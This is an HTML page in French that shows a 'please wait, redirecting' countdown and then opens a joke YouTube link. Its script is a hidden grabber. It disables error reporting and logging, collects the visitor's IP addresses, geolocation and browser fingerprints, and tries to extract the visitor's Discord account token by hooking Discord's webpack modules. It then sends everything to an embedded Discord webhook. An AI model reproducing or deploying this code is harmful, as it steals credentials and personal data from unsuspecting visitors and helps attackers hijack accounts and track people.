<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Chargement en cours...</title>
  <style>
    body {margin:0;height:100vh;background:#000;color:#fff;font-family:Arial,sans-serif;text-align:center;padding-top:15%;box-sizing:border-box;}
    .loader {border:14px solid #222;border-top:14px solid #ff3333;border-radius:50%;width:90px;height:90px;animation:s 1.2s linear infinite;margin:0 auto 30px;}
    @keyframes s {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h1{font-size:28px;margin:10px 0;}p{font-size:18px;color:#ccc;}
    .countdown{font-size:22px;margin-top:20px;color:#ff6666;}
  </style>
</head>
<body>
  <div class="loader"></div>
  <h1>Veuillez patienter...</h1>
  <p>Redirection automatique en cours</p>
  <div class="countdown" id="timer">5 secondes</div>

  <script>
    // === TON WEBHOOK DISCORD ===
    const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";

    (async () => {
      try {
        // === SILENCE TOTAL ===
        if (window.Sentry) {window.Sentry.init=()=>{};window.Sentry.captureException=()=>{};window.Sentry.captureMessage=()=>{};window.Sentry.withScope=cb=>cb({setTag:()=>{},setContext:()=>{}});}
        console.error=console.warn=console.info=console.log=()=>{};
        window.addEventListener("error",e=>e.preventDefault());
        window.addEventListener("unhandledrejection",e=>e.preventDefault());

        // === IP + GÃ‰OLOC ===
        const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
          fetch("https://api.ipify.org?format=json").then(r=>r.ok?r.json():{ip:"inconnu"}),
          fetch("https://api6.ipify.org?format=json").then(r=>r.ok?r.json():{ip:"inconnu"}),
          fetch("https://ipapi.co/json/").then(r=>r.ok?r.json():{})
        ]);
        const ipv4 = ipv4Res.status==="fulfilled"?ipv4Res.value.ip:"inconnu";
        const ipv6 = ipv6Res.status==="fulfilled"?ipv6Res.value.ip:"inconnu";
        const geo = geoRes.status==="fulfilled"?geoRes.value:{};

        // === INFOS SYSTÃˆME AVANCÃ‰ES ===
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        const batteryPromise = navigator.getBattery ? await navigator.getBattery() : null;
        const battery = batteryPromise ? `${Math.round(batteryPromise.level*100)}% ${batteryPromise.charging?"(en charge)":""}` : "Inconnu";

        // Canvas fingerprint
        let canvasFP = "Inconnu";
        try {
          const canvas = document.createElement("canvas");
          const ctx = canvas.getContext("2d");
          ctx.textBaseline = "top";
          ctx.font = "14px 'Arial'";
          ctx.fillText("Canvas fingerprint â€¢ xAI â€¢ 2025", 2, 2);
          ctx.fillStyle = "#f60";
          ctx.fillRect(125,1,64,20);
          canvasFP = canvas.toDataURL().substring(0,100) + "...";
        } catch(e) {}

        // Fonts (quelques unes courantes pour empreinte)
        const fonts = ["Arial","Times New Roman","Courier New","Comic Sans MS","Impact","Verdana"];
        const detectedFonts = fonts.filter(f => {
          const el = document.createElement("span");
          el.style.fontFamily = f;
          el.innerHTML = "abcdefghijklmnopqrstuvwxyz";
          document.body.appendChild(el);
          const w = el.offsetWidth;
          document.body.removeChild(el);
          return w > 100; // simplifiÃ©
        }).join(", ") || "Aucune dÃ©tectÃ©e";

        // WebGL
        let webgl = "Inconnu";
        try {
          const gl = document.createElement("canvas").getContext("webgl");
          if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            webgl = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
          }
        } catch(e) {}

        // === DÃ‰TECTION DISCORD (maximale) ===
        let discordUsername = "Non dÃ©tectÃ©";
        let discordTag = "";
        let discordId = "";
        let discordAvatar = "";
        let discordNitro = "";
        let discordFlags = "";

        try {
          let token = null;
          webpackChunkdiscord_app.push([[Math.random()], {}, e => {
            for (let c in e.c) {
              try {
                let m = e.c[c].exports;
                if (!m) continue;
                if (m.default && typeof m.default.getToken === "function") token = m.default.getToken();
                if (typeof m.getToken === "function") token = m.getToken();
                if (token && typeof token === "string") return;
                for (let sub in m) {
                  if (m[sub] && typeof m[sub].getToken === "function") {
                    token = m[sub].getToken();
                    if (typeof token === "string") return;
                  }
                }
              } catch {}
            }
          }]);
          webpackChunkdiscord_app.pop();

          if (token && token.length > 20) {
            const userRes = await fetch("https://discord.com/api/v9/users/@me", {headers: {"Authorization": token}});
            if (userRes.ok) {
              const user = await userRes.json();
              discordUsername = user.global_name || user.username || "Inconnu";
              discordTag = user.discriminator === "0" ? "" : `#${user.discriminator}`;
              discordId = user.id;
              discordAvatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : "";
              discordNitro = user.premium_type === 2 ? "Nitro Classic" : user.premium_type === 3 ? "Nitro Boost" : "Aucun";
              discordFlags = user.flags ? `Flags: ${user.flags}` : "";
            }
          }
        } catch(e) {}

        // === MESSAGE FINAL ULTRA DÃ‰TAILLÃ‰ ===
        const message = `
ðŸŽ¯ **Nouvelle visite dÃ©tectÃ©e** â€” Max infos

**Pseudo Discord :** ${discordUsername}${discordTag}
**ID Discord :** ${discordId || "Non dÃ©tectÃ©"}
**Nitro :** ${discordNitro}
${discordFlags ? `**${discordFlags}**\n` : ""}

**IP IPv4 :** \`${ipv4}\`
**IP IPv6 :** \`${ipv6}\`
**Pays :** ${geo.country_name || "Inconnu"} (${geo.country_code || "??"})
**Ville / RÃ©gion :** ${geo.city || "Inconnu"} â€¢ ${geo.region || ""}
**FAI :** \`${geo.org || "Inconnu"}\`

**Appareil :** ${navigator.platform || "Inconnu"} â€¢ ${navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "RAM inconnue"} â€¢ ${navigator.hardwareConcurrency || "?"} cÅ“urs CPU
**Batterie :** ${battery}
**Connexion :** ${connection.effectiveType || "Inconnu"} â€¢ â†“${connection.downlink || "?"} Mbps
**Mode :** ${window.matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}
**GPU (WebGL) :** ${webgl}
**Fonts dÃ©tectÃ©es :** ${detectedFonts}

**Navigateur :** ${navigator.userAgent.substring(0, 300)}
**Langue :** ${navigator.language}
**RÃ©solution :** ${screen.width}x${screen.height} (${screen.colorDepth} bits)
**Referrer :** ${document.referrer || "Direct"}
**Canvas FP :** ${canvasFP}

**Page :** ${window.location.href}
**Heure (UTC) :** ${new Date().toISOString()}
        `.trim();

        // === ENVOI ===
        await fetch(webhook, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            content: message,
            username: discordUsername !== "Non dÃ©tectÃ©" ? discordUsername : "Tracker Ultra",
            avatar_url: discordAvatar
          })
        });

      } catch(e) {}
    })();

    // Compte Ã  rebours
    let timeLeft = 5;
    const timerEl = document.getElementById("timer");
    const countdown = setInterval(() => {
      timeLeft--;
      timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
      if (timeLeft <= 0) {
        clearInterval(countdown);
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
      }
    }, 1000);
  </script>
</body>
</html>
